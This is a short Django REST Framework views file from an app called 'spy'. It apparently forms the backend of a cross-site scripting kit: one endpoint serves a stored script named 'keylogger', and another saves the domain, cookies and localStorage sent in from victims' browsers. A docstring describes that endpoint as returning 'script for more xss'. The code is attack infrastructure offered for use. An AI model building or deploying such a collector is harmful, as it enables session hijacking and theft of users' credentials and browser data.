from rest_framework.utils import json
from rest_framework.views import APIView
from rest_framework.response import Response
import spy.models


# Create your views here.

class ReturnScript(APIView):
    def get(self, *args, **kwargs):
        self.request.data.get('script')
        script = spy.models.Scripts.objects.filter(name='keylogger').values_list('script', flat=True).first()
        return Response({'status': True, 'script': script})

    def post(self, *args, **kwargs):
        pass


class Logs(APIView):
    def get(self, *args, **kwargs):
        print(self)
        pass

    def post(self, *args, **kwargs):
        """
        Read/Write Logs from user view and return script for more xss
        """
        domain = self.request.data.get('domain')
        localstorage = self.request.data.get('localstorage')
        cookies = self.request.data.get('cookies')

        log = spy.models.Logs(domain=domain, localstorage=json.dumps(localstorage), cookies=json.dumps(cookies))
        log.save()

        return Response({'status': True})
